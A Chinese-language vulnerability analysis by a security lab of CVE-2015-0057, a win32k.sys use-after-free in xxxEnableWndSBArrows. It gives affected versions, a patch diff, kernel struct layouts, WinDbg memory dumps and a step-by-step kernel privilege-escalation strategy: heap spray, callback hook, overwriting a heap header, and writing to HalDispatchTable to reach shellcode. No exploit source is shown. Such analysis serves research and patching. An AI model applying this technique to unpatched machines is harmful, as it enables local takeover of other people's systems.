@@ -1,0 +1,793 @@
+**作者： 深信服千里目安全实验室  
+原文链接：<https://mp.weixin.qq.com/s/9-fXGgS0zNagyVWF2lwklg>**
+
+## 一、漏洞信息
+
+### 1、漏洞简述
+
+  * 漏洞名称：Microsoft Windows Win32k Local Privilege Escalation Vulnerability
+  * 漏洞编号：CVE-2015-0057
+  * 漏洞类型：UAF
+  * 漏洞影响：本地提权
+  * CVSS3.0：N/A
+  * CVSS2.0：7.2
+
+### 2、组件和漏洞概述
+
+win32k.sys是Windows的多用户管理的sys文件。
+
+Windows内核模式驱动程序（Win32k.sys）中存在一个特权提升漏洞，该漏洞不当处理内存中的对象时引起。成功利用此漏洞的攻击者可以获得更高的特权并读取任意数量的内核内存。攻击者可能会安装程序;查看，更改或删除数据；或创建具有完全管理权限的新帐户。
+
+### 3、影响版本
+
+Windows Server 2003 Service Pack 2
+
+Windows Server 2008 Service Pack 2
+
+Windows Server 2008 R2 Service Pack 1
+
+Windows Vista Service Pack 2
+
+Windows Server 2012
+
+Windows Server 2012 R2
+
+Windows 7 Service Pack 1
+
+Windows 8
+
+Windows 8.1
+
+Windows RT
+
+Windows RT 8.1
+
+### 4、解决方案
+
+<https://docs.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-010>
+
+## 二、漏洞复现
+
+### 1、环境搭建
+
+Windows：Windows 7 sp1 x86，Windows 8.1 x64
+
+win32k.sys：6.1.7601.17514，6.3.9600.17393
+
+### 2、复现过程
+
+运行指定版本的系统，执行EXP
+
+![image-20201127102054263](https://images.seebug.org/content/images/2020/12/29/1609212882000-image-20201127102054263.png-w331s)
+
+![image-20201203213248108](https://images.seebug.org/content/images/2020/12/29/1609212882000-image-20201203213248108.png-w331s)
+
+## 三、漏洞分析
+
+### 1、基本信息
+
+  * 漏洞文件：win32k.sys
+  * 漏洞函数：xxxEnableWndSBArrows
+  * 漏洞对象：tagWND
+
+### 2、背景知识
+
+##### tagSBINFO（tagWND+0xB0）
+
+大小0x24，是本次UAF的对象
+
+![image-20201204113939529](https://images.seebug.org/content/images/2020/12/29/1609212882000-image-20201204113939529.png-w331s)
+
+##### tagPROPLIST（tagWND+0xA8）
+
+![image-20201204115038744](https://images.seebug.org/content/images/2020/12/29/1609212882000-image-20201204115038744.png-w331s)
+
+##### tagPROP
+
+![image-20201206135109319](https://images.seebug.org/content/images/2020/12/29/1609212882000-image-20201206135109319.png-w331s)
+
+##### _LARGE_UNICODE_STRING（tagWND+0xD8）
+
+![image-20201204115447715](https://images.seebug.org/content/images/2020/12/29/1609212883000-image-20201204115447715.png-w331s)
+
+_LARGE_UNICODE_STRING，由`RtlInitLargeUnicodeString`函数可以初始化Buffer，
+`NtUserDefSetText`可以设置 tagWND 的 strName 字段，此函数可以做到桌面堆大小的任意分配
+
+![image-20201204141424033](https://images.seebug.org/content/images/2020/12/29/1609212883000-image-20201204141424033.png-w331s)
+
+![image-20201204141622892](https://images.seebug.org/content/images/2020/12/29/1609212883000-image-20201204141622892.png-w331s)
+
+##### tagMENU（tagWND+0xB8，tagWND+0xC0）
+
+![image-20201204141839722](https://images.seebug.org/content/images/2020/12/29/1609212883000-image-20201204141839722.png-w331s)
+
+![image-20201204142858297](https://images.seebug.org/content/images/2020/12/29/1609212883000-image-20201204142858297.png-w331s)
+
+#### _HEAP_ENTRY
+
+表示堆头，大小为0x10，前8字节如果有对齐的需要就存放上一个堆块的数据，在这里一般是长度为0x8
+
+    
+    
+    kd> dt _heap_entry -vr
+    nt!_HEAP_ENTRY
+    struct _HEAP_ENTRY, 22 elements, 0x10 bytes
+       +0x000 PreviousBlockPrivateData : Ptr64 to Void
+       +0x008 Size             : Uint2B
+       +0x00a Flags            : UChar
+       +0x00b SmallTagIndex    : UChar
+       +0x00c PreviousSize     : Uint2B
+       +0x00e SegmentOffset    : UChar
+       +0x00e LFHFlags         : UChar
+       +0x00f UnusedBytes      : UChar
+       +0x008 CompactHeader    : Uint8B
+       +0x000 Reserved         : Ptr64 to Void
+       +0x008 FunctionIndex    : Uint2B
+       +0x00a ContextValue     : Uint2B
+       +0x008 InterceptorValue : Uint4B
+       +0x00c UnusedBytesLength : Uint2B
+       +0x00e EntryOffset      : UChar
+       +0x00f ExtendedBlockSignature : UChar
+       +0x000 ReservedForAlignment : Ptr64 to Void
+       +0x008 Code1            : Uint4B
+       +0x00c Code2            : Uint2B
+       +0x00e Code3            : UChar
+       +0x00f Code4            : UChar
+       +0x008 AgregateCode     : Uint8B
+
+### 3、补丁对比
+
+bindiff比较，主要是补丁代码处将rbx和rsi+0xb0的值进行了比较
+
+![image-20201203195010274](https://images.seebug.org/content/images/2020/12/29/1609212883000-image-20201203195010274.png-w331s)
+
+看一下反编译后的补丁对比，可以看到补丁后的43行加了一层判断，假如不满足条件，则会跳转到错误处理函数
+
+![image-20201203192635880](https://images.seebug.org/content/images/2020/12/29/1609212883000-image-20201203192635880.png-w331s)
+
+![image-20201203192845119](https://images.seebug.org/content/images/2020/12/29/1609212883000-image-20201203192845119.png-w331s)
+
+### 4、漏洞分析
+
+#### 漏洞利用流程
+
+1、首先通过堆喷将一段堆空间覆盖成大量tagWND+tagPROPLIST的结构，有一块是tagWND+tagSBINFO
+
+2、之后通过用户态回调（xxxDrawScrollBar）hook了_ClientLoadLibrary函数。然后我们将我们自己定义回调回来的tagWND释放掉，再次通过setPROP申请回来，此时原来的tagSBINFO（0x28+0x8）的数据结构就变成tagPROPLIST+tagPROP（0x18+0x10+0x8）的结构了
+
+![image-20201207110606663](https://images.seebug.org/content/images/2020/12/29/1609212884000-image-20201207110606663.png-w331s)
+
+3、后续系统将这块空间（原tagSBINFO现tagPROPLIST+tagPROP）进行了写入操作，将里面的cEntries由0x2改为了0xe，这样我们就可以覆盖（0xe-0x2）*0x10大小的缓冲区了（这里就实现了UAF，通过原tagSBINFO的指针将第一个字节进行了改变，这样的操作在tagSBINFO中是很正常的，但是在tagPROPLIST中就可以造成缓冲区溢出，我们可以多溢出0xc个tagPROP大小）
+
+![image-20201207111038212](https://images.seebug.org/content/images/2020/12/29/1609212884000-image-20201207111038212.png-w331s)
+
+4、在原tagSBINFO现tagPROPLIST+tagPROP的位置后面放入strNAME+tagMENU的结构，通过覆盖堆头，修改堆块大小标识符，将后面tagMENU的空间也覆盖入这个堆块上了，这样我们释放这个堆块，后面的tagMENU也被释放了，但是这个堆块的句柄还在我们手里，再次进行分配，就又造成了一次UAF漏洞（覆盖堆头的目的是为了UAF，我们可以先用`SetMenuItemInfoA`函数修改
+rgItems
+字段从而实现任意写，写的内容就是shellcode的指针，这个位置实际上就是HalDispatchTable+0x8的位置，之后覆盖整块空间再分配，通过rop执行到shellcode的地址，完成提权）
+
+数据结构大概如此图：
+
+![6](https://images.seebug.org/content/images/2020/12/29/1609212884000-6.png-w331s)
+
+#### 静态分析：
+
+先看一下漏洞函数，这样看起来比较丑，我们并不知道这里面的诸如v3等等的变量含义是什么意思，这时我们可以在windbg里面通过dt查看tagWND的结构体
+
+![image-20201204173442385](https://images.seebug.org/content/images/2020/12/29/1609212884000-image-20201204173442385.png-w331s)
+
+    
+    
+    kd> dt win32k!tagWND
+       +0x000 head             : _THRDESKHEAD
+       +0x028 state            : Uint4B
+       +0x028 bHasMeun         : Pos 0, 1 Bit
+       +0x028 bHasVerticalScrollbar : Pos 1, 1 Bit
+       +0x028 bHasHorizontalScrollbar : Pos 2, 1 Bit
+       +0x028 bHasCaption      : Pos 3, 1 Bit
+       +0x028 bSendSizeMoveMsgs : Pos 4, 1 Bit
+       +0x028 bMsgBox          : Pos 5, 1 Bit
+       +0x028 bActiveFrame     : Pos 6, 1 Bit
+       +0x028 bHasSPB          : Pos 7, 1 Bit
+       +0x028 bNoNCPaint       : Pos 8, 1 Bit
+       +0x028 bSendEraseBackground : Pos 9, 1 Bit
+       +0x028 bEraseBackground : Pos 10, 1 Bit
+       +0x028 bSendNCPaint     : Pos 11, 1 Bit
+       +0x028 bInternalPaint   : Pos 12, 1 Bit
+       +0x028 bUpdateDirty     : Pos 13, 1 Bit
+       +0x028 bHiddenPopup     : Pos 14, 1 Bit
+       +0x028 bForceMenuDraw   : Pos 15, 1 Bit
+       +0x028 bDialogWindow    : Pos 16, 1 Bit
+       +0x028 bHasCreatestructName : Pos 17, 1 Bit
+       +0x028 bServerSideWindowProc : Pos 18, 1 Bit
+       +0x028 bAnsiWindowProc  : Pos 19, 1 Bit
+       +0x028 bBeingActivated  : Pos 20, 1 Bit
+       +0x028 bHasPalette      : Pos 21, 1 Bit
+       +0x028 bPaintNotProcessed : Pos 22, 1 Bit
+       +0x028 bSyncPaintPending : Pos 23, 1 Bit
+       +0x028 bRecievedQuerySuspendMsg : Pos 24, 1 Bit
+       +0x028 bRecievedSuspendMsg : Pos 25, 1 Bit
+       +0x028 bToggleTopmost   : Pos 26, 1 Bit
+       +0x028 bRedrawIfHung    : Pos 27, 1 Bit
+       +0x028 bRedrawFrameIfHung : Pos 28, 1 Bit
+       +0x028 bAnsiCreator     : Pos 29, 1 Bit
+       +0x028 bMaximizesToMonitor : Pos 30, 1 Bit
+       +0x028 bDestroyed       : Pos 31, 1 Bit
+       +0x02c state2           : Uint4B
+       +0x02c bWMPaintSent     : Pos 0, 1 Bit
+       +0x02c bEndPaintInvalidate : Pos 1, 1 Bit
+       +0x02c bStartPaint      : Pos 2, 1 Bit
+       +0x02c bOldUI           : Pos 3, 1 Bit
+       +0x02c bHasClientEdge   : Pos 4, 1 Bit
+       +0x02c bBottomMost      : Pos 5, 1 Bit
+       +0x02c bFullScreen      : Pos 6, 1 Bit
+       +0x02c bInDestroy       : Pos 7, 1 Bit
+       +0x02c bWin31Compat     : Pos 8, 1 Bit
+       +0x02c bWin40Compat     : Pos 9, 1 Bit
+       +0x02c bWin50Compat     : Pos 10, 1 Bit
+       +0x02c bMaximizeMonitorRegion : Pos 11, 1 Bit
+       +0x02c bCloseButtonDown : Pos 12, 1 Bit
+       +0x02c bMaximizeButtonDown : Pos 13, 1 Bit
+       +0x02c bMinimizeButtonDown : Pos 14, 1 Bit
+       +0x02c bHelpButtonDown  : Pos 15, 1 Bit
+       +0x02c bScrollBarLineUpBtnDown : Pos 16, 1 Bit
+       +0x02c bScrollBarPageUpBtnDown : Pos 17, 1 Bit
+       +0x02c bScrollBarPageDownBtnDown : Pos 18, 1 Bit
+       +0x02c bScrollBarLineDownBtnDown : Pos 19, 1 Bit
+       +0x02c bAnyScrollButtonDown : Pos 20, 1 Bit
+       +0x02c bScrollBarVerticalTracking : Pos 21, 1 Bit
+       +0x02c bForceNCPaint    : Pos 22, 1 Bit
+       +0x02c bForceFullNCPaintClipRgn : Pos 23, 1 Bit
+       +0x02c FullScreenMode   : Pos 24, 3 Bits
+       +0x02c bCaptionTextTruncated : Pos 27, 1 Bit
+       +0x02c bNoMinmaxAnimatedRects : Pos 28, 1 Bit
+       +0x02c bSmallIconFromWMQueryDrag : Pos 29, 1 Bit
+       +0x02c bShellHookRegistered : Pos 30, 1 Bit
+       +0x02c bWMCreateMsgProcessed : Pos 31, 1 Bit
+       +0x030 ExStyle          : Uint4B
+       +0x030 bWS_EX_DLGMODALFRAME : Pos 0, 1 Bit
+       +0x030 bUnused1         : Pos 1, 1 Bit
+       +0x030 bWS_EX_NOPARENTNOTIFY : Pos 2, 1 Bit
+       +0x030 bWS_EX_TOPMOST   : Pos 3, 1 Bit
+       +0x030 bWS_EX_ACCEPTFILE : Pos 4, 1 Bit
+       +0x030 bWS_EX_TRANSPARENT : Pos 5, 1 Bit
+       +0x030 bWS_EX_MDICHILD  : Pos 6, 1 Bit
+       +0x030 bWS_EX_TOOLWINDOW : Pos 7, 1 Bit
+       +0x030 bWS_EX_WINDOWEDGE : Pos 8, 1 Bit
+       +0x030 bWS_EX_CLIENTEDGE : Pos 9, 1 Bit
+       +0x030 bWS_EX_CONTEXTHELP : Pos 10, 1 Bit
+       +0x030 bMakeVisibleWhenUnghosted : Pos 11, 1 Bit
+       +0x030 bWS_EX_RIGHT     : Pos 12, 1 Bit
+       +0x030 bWS_EX_RTLREADING : Pos 13, 1 Bit
+       +0x030 bWS_EX_LEFTSCROLLBAR : Pos 14, 1 Bit
+       +0x030 bUnused2         : Pos 15, 1 Bit
+       +0x030 bWS_EX_CONTROLPARENT : Pos 16, 1 Bit
+       +0x030 bWS_EX_STATICEDGE : Pos 17, 1 Bit
+       +0x030 bWS_EX_APPWINDOW : Pos 18, 1 Bit
+       +0x030 bWS_EX_LAYERED   : Pos 19, 1 Bit
+       +0x030 bWS_EX_NOINHERITLAYOUT : Pos 20, 1 Bit
+       +0x030 bUnused3         : Pos 21, 1 Bit
+       +0x030 bWS_EX_LAYOUTRTL : Pos 22, 1 Bit
+       +0x030 bWS_EX_NOPADDEDBORDER : Pos 23, 1 Bit
+       +0x030 bUnused4         : Pos 24, 1 Bit
+       +0x030 bWS_EX_COMPOSITED : Pos 25, 1 Bit
+       +0x030 bUIStateActive   : Pos 26, 1 Bit
+       +0x030 bWS_EX_NOACTIVATE : Pos 27, 1 Bit
+       +0x030 bWS_EX_COMPOSITEDCompositing : Pos 28, 1 Bit
+       +0x030 bRedirected      : Pos 29, 1 Bit
+       +0x030 bUIStateKbdAccelHidden : Pos 30, 1 Bit
+       +0x030 bUIStateFocusRectHidden : Pos 31, 1 Bit
+       +0x034 style            : Uint4B
+       +0x034 bReserved1       : Pos 0, 16 Bits
+       +0x034 bWS_MAXIMIZEBOX  : Pos 16, 1 Bit
+       +0x034 bReserved2       : Pos 0, 16 Bits
+       +0x034 bWS_TABSTOP      : Pos 16, 1 Bit
+       +0x034 bReserved3       : Pos 0, 16 Bits
+       +0x034 bUnused5         : Pos 16, 1 Bit
+       +0x034 bWS_MINIMIZEBOX  : Pos 17, 1 Bit
+       +0x034 bReserved4       : Pos 0, 16 Bits
+       +0x034 bUnused6         : Pos 16, 1 Bit
+       +0x034 bWS_GROUP        : Pos 17, 1 Bit
+       +0x034 bReserved5       : Pos 0, 16 Bits
+       +0x034 bUnused7         : Pos 16, 2 Bits
+       +0x034 bWS_THICKFRAME   : Pos 18, 1 Bit
+       +0x034 bReserved6       : Pos 0, 16 Bits
+       +0x034 bUnused8         : Pos 16, 2 Bits
+       +0x034 bWS_SIZEBOX      : Pos 18, 1 Bit
+       +0x034 bReserved7       : Pos 0, 16 Bits
+       +0x034 bUnused9         : Pos 16, 3 Bits
+       +0x034 bWS_SYSMENU      : Pos 19, 1 Bit
+       +0x034 bWS_HSCROLL      : Pos 20, 1 Bit
+       +0x034 bWS_VSCROLL      : Pos 21, 1 Bit
+       +0x034 bWS_DLGFRAME     : Pos 22, 1 Bit
+       +0x034 bWS_BORDER       : Pos 23, 1 Bit
+       +0x034 bMaximized       : Pos 24, 1 Bit
+       +0x034 bWS_CLIPCHILDREN : Pos 25, 1 Bit
+       +0x034 bWS_CLIPSIBLINGS : Pos 26, 1 Bit
+       +0x034 bDisabled        : Pos 27, 1 Bit
+       +0x034 bVisible         : Pos 28, 1 Bit
+       +0x034 bMinimized       : Pos 29, 1 Bit
+       +0x034 bWS_CHILD        : Pos 30, 1 Bit
+       +0x034 bWS_POPUP        : Pos 31, 1 Bit
+       +0x038 hModule          : Ptr64 Void
+       +0x040 hMod16           : Uint2B
+       +0x042 fnid             : Uint2B
+       +0x048 spwndNext        : Ptr64 tagWND
+       +0x050 spwndPrev        : Ptr64 tagWND
+       +0x058 spwndParent      : Ptr64 tagWND
+       +0x060 spwndChild       : Ptr64 tagWND
+       +0x068 spwndOwner       : Ptr64 tagWND
+       +0x070 rcWindow         : tagRECT
+       +0x080 rcClient         : tagRECT
+       +0x090 lpfnWndProc      : Ptr64     int64 
+       +0x098 pcls             : Ptr64 tagCLS
+       +0x0a0 hrgnUpdate       : Ptr64 HRGN__
+       +0x0a8 ppropList        : Ptr64 tagPROPLIST          
+       +0x0b0 pSBInfo          : Ptr64 tagSBINFO
+       +0x0b8 spmenuSys        : Ptr64 tagMENU
+       +0x0c0 spmenu           : Ptr64 tagMENU
+       +0x0c8 hrgnClip         : Ptr64 HRGN__
+       +0x0d0 hrgnNewFrame     : Ptr64 HRGN__
+       +0x0d8 strName          : _LARGE_UNICODE_STRING
+       +0x0e8 cbwndExtra       : Int4B
+       +0x0f0 spwndLastActive  : Ptr64 tagWND
+       +0x0f8 hImc             : Ptr64 HIMC__
+       +0x100 dwUserData       : Uint8B
+       +0x108 pActCtx          : Ptr64 _ACTIVATION_CONTEXT
+       +0x110 pTransform       : Ptr64 _D3DMATRIX
+       +0x118 spwndClipboardListenerNext : Ptr64 tagWND
+       +0x120 ExStyle2         : Uint4B
+       +0x120 bClipboardListener : Pos 0, 1 Bit
+       +0x120 bLayeredInvalidate : Pos 1, 1 Bit
+       +0x120 bRedirectedForPrint : Pos 2, 1 Bit
+       +0x120 bLinked          : Pos 3, 1 Bit
+       +0x120 bLayeredForDWM   : Pos 4, 1 Bit
+       +0x120 bLayeredLimbo    : Pos 5, 1 Bit
+       +0x120 bHIGHDPI_UNAWARE_Unused : Pos 6, 1 Bit
+       +0x120 bVerticallyMaximizedLeft : Pos 7, 1 Bit
+       +0x120 bVerticallyMaximizedRight : Pos 8, 1 Bit
+       +0x120 bHasOverlay      : Pos 9, 1 Bit
+       +0x120 bConsoleWindow   : Pos 10, 1 Bit
+       +0x120 bChildNoActivate : Pos 11, 1 Bit
+
+通过结构体，我们可以清楚的知晓要操作哪一块内存，下面是优化后函数的部分截图，这里面的第二个和第三个参数可以通过在线网站
+
+<https://doxygen.reactos.org/>
+
+来查询内核函数的原型函数，不过问题不大，我们知道了v3就是pSBInfo就可以了，上面对一些结构体进行了介绍
+
+![image-20201204180131653](https://images.seebug.org/content/images/2020/12/29/1609212884000-image-20201204180131653.png-w331s)
+
+如果只对这个漏洞进行POC的编写，分析到这一步就可以了，步骤大概为：
+
+>
+> 窗口创建->EnableScrollBar（后面两个参数为3）->CreateWindowExA->设置ShowWindow和UpdateWindow使窗口可见->Hook__ClientLoadLibrary并DestroyWindow
+
+接下来继续看下哪里出了问题导致这次攻击的发生，观察伪代码发现，在2处堆pSBInfo进行了修改
+
+![image-20201205092343101](https://images.seebug.org/content/images/2020/12/29/1609212884000-image-20201205092343101.png-w331s)
+
+方才的伪代码在汇编中的形式如下，正常情况下函数会走到1的位置
+
+![image-20201205092648330](https://images.seebug.org/content/images/2020/12/29/1609212884000-image-20201205092648330.png-w331s)
+
+在上面的分析我们得出了结论，发现在这里将0x2改为了0xe，造成了UAF
+
+#### 补丁前动态分析：
+
+我们先看一下回调函数的调用栈，我们在调用xxxDrawScrollBar的地址和该地址的下一条指令下断点，再向nt!KeUserModeCallback下断点（因为任何的user-mode callback流程最终内核到用户层的入口点都会是 nt!KeUserModeCallback）
+
+![image-20201206115546324](https://images.seebug.org/content/images/2020/12/29/1609212885000-image-20201206115546324.png-w331s)
+
+这时我们执行，观察函数调用栈
+
+![image-20201206120927932](https://images.seebug.org/content/images/2020/12/29/1609212885000-image-20201206120927932.png-w331s)
+
+此时我们查看下tagWND的数据结构，rdi的值为tagWND的起始地址
+
+![image-20201205103543529](https://images.seebug.org/content/images/2020/12/29/1609212885000-image-20201205103543529.png-w331s)
+
+![image-20201205104146985](https://images.seebug.org/content/images/2020/12/29/1609212885000-image-20201205104146985.png-w331s)
+
+现在前置内容已经讲完了，我们从头来看一下这个程序实际执行的时候会有什么样的动作
+
+首先下硬件断点
+
+![image-20201204155638702](https://images.seebug.org/content/images/2020/12/29/1609212885000-image-20201204155638702.png-w331s)
+
+之后执行exp，可以看到windbg中断在了函数起始的位置
+
+![image-20201204155829876](https://images.seebug.org/content/images/2020/12/29/1609212885000-image-20201204155829876.png-w331s)
+
+![image-20201204155853092](https://images.seebug.org/content/images/2020/12/29/1609212886000-image-20201204155853092.png-w331s)
+
+然后执行到第一个xxxDrawScrollBar的位置上，此时观察下rbx和rdi+0xb0位置上的值，可以观察到，此时rdi+0xb0位置上的值还并未改变
+
+![image-20201204163035513](https://images.seebug.org/content/images/2020/12/29/1609212886000-image-20201204163035513.png-w331s)
+
+这时F10进入下一步，执行完了xxxDrawScrollBar，再观察下rbx和rdi+0xb0位置的值，可以发现，两块缓冲区都被破坏掉了
+
+![image-20201204163148240](https://images.seebug.org/content/images/2020/12/29/1609212886000-image-20201204163148240.png-w331s)
+
+此时我们看rdi已经没有用了，我们真正操作的桌面堆空间实际上是rbx附近的内存空间，而其附近的内存空间已被堆喷排布过了，该空间布局可供参考，有助于理解该漏洞对内存的操作
+
+    
+    
+    d> dd rbx-0x200 L200
+    fffff901`40974990  00000000 00000000 00000000 00000000
+    fffff901`409749a0  40c9b9f0 fffff901 00000000 00000000
+    fffff901`409749b0  00000000 00000000 00000000 00000000
+    fffff901`409749c0  00000000 00000000 00000000 00000000
+    fffff901`409749d0  00000000 00000000 00000000 00000000
+    fffff901`409749e0  00000000 00000000 9ff56c80 08000874
+    fffff901`409749f0  00000002 00000002 aaaabbbb aaaabbbb
+    fffff901`40974a00  00000001 00000000 bbbbbbbb bbbbbbbb
+    fffff901`40974a10  0000225e 00000000 96f56c89 0800087d
+    fffff901`40974a20  000302af 00000000 00000000 00000000
+    fffff901`40974a30  00000000 00000000 da0a2090 ffffe000
+    fffff901`40974a40  40974a20 fffff901 00000000 00000000
+    fffff901`40974a50  00000008 00000001 00000000 00000000
+    fffff901`40974a60  00000000 00000000 00000000 00000000
+    fffff901`40974a70  40c9be80 fffff901 00000000 00000000
+    fffff901`40974a80  00000000 00000000 00000000 00000000
+    fffff901`40974a90  00000000 00000000 00000000 00000000
+    fffff901`40974aa0  00000000 00000000 00000000 00000000
+    fffff901`40974ab0  00000000 00000000 9ff56c80 08000874
+    fffff901`40974ac0  00000002 00000002 aaaabbbb aaaabbbb
+    fffff901`40974ad0  00000001 00000000 bbbbbbbb bbbbbbbb
+    fffff901`40974ae0  0000225f 00000000 96f56c89 0800087d
+    fffff901`40974af0  000302b1 00000000 00000000 00000000
+    fffff901`40974b00  00000000 00000000 da0a2090 ffffe000
+    fffff901`40974b10  40974af0 fffff901 00000000 00000000
+    fffff901`40974b20  00000008 00000001 00000000 00000000
+    fffff901`40974b30  00000000 00000000 00000000 00000000
+    fffff901`40974b40  40c9c310 fffff901 00000000 00000000
+    fffff901`40974b50  00000000 00000000 00000000 00000000
+    fffff901`40974b60  00000000 00000000 00000000 00000000
+    fffff901`40974b70  00000000 00000000 00000000 00000000
+    fffff901`40974b80  00000000 00000000 9ff56c80 08000874
+    fffff901`40974b90  00000002 00000002 aaaabbbb aaaabbbb
+    fffff901`40974ba0  00000001 00000000 ccccdddd ccccdddd
+    fffff901`40974bb0  00000006 00000000 8cf56c93 1000087d
+    fffff901`40974bc0  43434343 43434343 43434343 43434343
+    fffff901`40974bd0  43434343 43434343 43434343 43434343
+    fffff901`40974be0  43434343 43434343 43434343 43434343
+    fffff901`40974bf0  43434343 43434343 43434343 43434343
+    fffff901`40974c00  43434343 43434343 43434343 43434343
+    fffff901`40974c10  43434343 43434343 43434343 43434343
+    fffff901`40974c20  43434343 43434343 43434343 43434343
+    fffff901`40974c30  43434343 43434343 43434343 43434343
+    fffff901`40974c40  43434343 43434343 43434343 43434343
+    fffff901`40974c50  43434343 43434343 43434343 43434343
+    fffff901`40974c60  43434343 43434343 43434343 43434343
+    fffff901`40974c70  43434343 43434343 43434343 43434343
+    fffff901`40974c80  43434343 43434343 43434343 43434343
+    fffff901`40974c90  43434343 43434343 43434343 43434343
+    fffff901`40974ca0  43434343 43434343 43434343 43434343
+    fffff901`40974cb0  00000000 00000000 96f56c89 0800086e
+    fffff901`40974cc0  000302b3 00000000 00000000 00000000
+    fffff901`40974cd0  00000000 00000000 da0a2090 ffffe000
+    fffff901`40974ce0  40974cc0 fffff901 00000000 00000000
+    fffff901`40974cf0  00000008 00000001 00000000 00000000
+    fffff901`40974d00  00000000 00000000 00000000 00000000
+    fffff901`40974d10  40c9c7a0 fffff901 00000000 00000000
+    fffff901`40974d20  00000000 00000000 00000000 00000000
+    fffff901`40974d30  00000000 00000000 00000000 00000000
+    fffff901`40974d40  00000000 00000000 00000000 00000000
+    fffff901`40974d50  00000000 00000000 8cf56c93 10000874
+    fffff901`40974d60  00000000 00000000 9df56d83 10000865
+    fffff901`40974d70  41414141 41414141 41414141 41414141
+    fffff901`40974d80  41414141 41414141 41414141 41414141
+    fffff901`40974d90  41414141 41414141 41414141 41414141
+    fffff901`40974da0  41414141 41414141 41414141 41414141
+    fffff901`40974db0  41414141 41414141 41414141 41414141
+    fffff901`40974dc0  41414141 41414141 41414141 41414141
+    fffff901`40974dd0  41414141 41414141 41414141 41414141
+    fffff901`40974de0  41414141 41414141 41414141 41414141
+    fffff901`40974df0  41414141 41414141 41414141 41414141
+    fffff901`40974e00  41414141 41414141 41414141 41414141
+    fffff901`40974e10  41414141 41414141 41414141 41414141
+    fffff901`40974e20  41414141 41414141 41414141 41414141
+    fffff901`40974e30  41414141 41414141 41414141 41414141
+    fffff901`40974e40  41414141 41414141 41414141 41414141
+    fffff901`40974e50  00000000 00000000 9ff56c80 0800086e
+    fffff901`40974e60  00000002 00000002 aaaabbbb aaaabbbb
+    fffff901`40974e70  00000001 00000000 bbbbbbbb bbbbbbbb
+    fffff901`40974e80  00002261 00000000 96f56c89 0800087d
+    fffff901`40974e90  000302b5 00000000 00000000 00000000
+    fffff901`40974ea0  00000000 00000000 da0a2090 ffffe000
+    fffff901`40974eb0  40974e90 fffff901 00000000 00000000
+    fffff901`40974ec0  00000008 00000001 00000000 00000000
+    fffff901`40974ed0  00000000 00000000 00000000 00000000
+    fffff901`40974ee0  40c9cc30 fffff901 00000000 00000000
+    fffff901`40974ef0  00000000 00000000 00000000 00000000
+    fffff901`40974f00  00000000 00000000 00000000 00000000
+    fffff901`40974f10  00000000 00000000 00000000 00000000
+    fffff901`40974f20  00000000 00000000 9ff56c80 08000874
+    fffff901`40974f30  00000002 00000002 aaaabbbb aaaabbbb
+    fffff901`40974f40  00000001 00000000 bbbbbbbb bbbbbbbb
+    fffff901`40974f50  00002262 00000000 96f56c89 0800087d
+    fffff901`40974f60  000302b7 00000000 00000000 00000000
+    fffff901`40974f70  00000000 00000000 da0a2090 ffffe000
+    fffff901`40974f80  40974f60 fffff901 00000000 00000000
+    fffff901`40974f90  00000008 00000001 00000000 00000000
+    fffff901`40974fa0  00000000 00000000 00000000 00000000
+    fffff901`40974fb0  40c9d0c0 fffff901 00000000 00000000
+    fffff901`40974fc0  00000000 00000000 00000000 00000000
+    fffff901`40974fd0  00000000 00000000 00000000 00000000
+    fffff901`40974fe0  00000000 00000000 00000000 00000000
+    fffff901`40974ff0  00000000 00000000 9ff56c80 08000874
+    fffff901`40975000  00000002 00000002 aaaabbbb aaaabbbb
+    fffff901`40975010  00000001 00000000 bbbbbbbb bbbbbbbb
+    fffff901`40975020  00002263 00000000 96f56c89 0800087d
+    fffff901`40975030  000302b9 00000000 00000000 00000000
+    fffff901`40975040  00000000 00000000 da0a2090 ffffe000
+    fffff901`40975050  40975030 fffff901 00000000 00000000
+    fffff901`40975060  00000008 00000001 00000000 00000000
+    fffff901`40975070  00000000 00000000 00000000 00000000
+    fffff901`40975080  40c9d550 fffff901 00000000 00000000
+    fffff901`40975090  00000000 00000000 00000000 00000000
+    fffff901`409750a0  00000000 00000000 00000000 00000000
+    fffff901`409750b0  00000000 00000000 00000000 00000000
+    fffff901`409750c0  00000000 00000000 9ff56c80 08000874
+    fffff901`409750d0  00000002 00000002 aaaabbbb aaaabbbb
+    fffff901`409750e0  00000001 00000000 bbbbbbbb bbbbbbbb
+    fffff901`409750f0  00002264 00000000 96f56c89 0800087d
+    fffff901`40975100  000302bb 00000000 00000000 00000000
+    fffff901`40975110  00000000 00000000 da0a2090 ffffe000
+    fffff901`40975120  40975100 fffff901 00000000 00000000
+    fffff901`40975130  00000008 00000001 00000000 00000000
+    fffff901`40975140  00000000 00000000 00000000 00000000
+    fffff901`40975150  40c9d9e0 fffff901 00000000 00000000
+    fffff901`40975160  00000000 00000000 00000000 00000000
+    fffff901`40975170  00000000 00000000 00000000 00000000
+    fffff901`40975180  00000000 00000000 00000000 00000000
+
+此时直接观察rbx，结构还是taSBINFO的结构
+
+![image-20201207153600256](https://images.seebug.org/content/images/2020/12/29/1609212886000-image-20201207153600256.png-w331s)
+
+之后步过xxxDrawScrollBar，此时数据结构已经换成了tagPROPLIST+tagPROP
+
+![image-20201207153758965](https://images.seebug.org/content/images/2020/12/29/1609212886000-image-20201207153758965.png-w331s)
+
+其实上面的两块（其实是同一块）数据结构前面还有一个堆头，如下所示，只不过rbx存储的是带有实际意义的数据结构的起始位置
+
+![image-20201207154108989](https://images.seebug.org/content/images/2020/12/29/1609212887000-image-20201207154108989.png-w331s)
+
+当执行过fffff960`003254de之后，cEntries变为了0xe，此时再次使用，就可以向后覆盖_heap_entry
+
+![image-20201207154404047](https://images.seebug.org/content/images/2020/12/29/1609212887000-image-20201207154404047.png-w331s)
+
+此时的数据结构
+
+    
+    
+    kd> dd rbx-8 L100
+    fffff901`40a73a08  9ff56c80 08000874 0000000e 00000002      tagProplist start
+    fffff901`40a73a18  aaaabbbb aaaabbbb 00000001 00000000
+    fffff901`40a73a28  ccccdddd ccccdddd 00000006 00000000      tagProplist end     
+    fffff901`40a73a38  8cf56c93 1000087d 43434343 43434343      _heap_entry被修改，此时后面的tagMENU结构被该堆头覆盖
+    fffff901`40a73a48  43434343 43434343 43434343 43434343
+    fffff901`40a73a58  43434343 43434343 43434343 43434343
+    fffff901`40a73a68  43434343 43434343 43434343 43434343
+    fffff901`40a73a78  43434343 43434343 43434343 43434343
+    fffff901`40a73a88  43434343 43434343 43434343 43434343
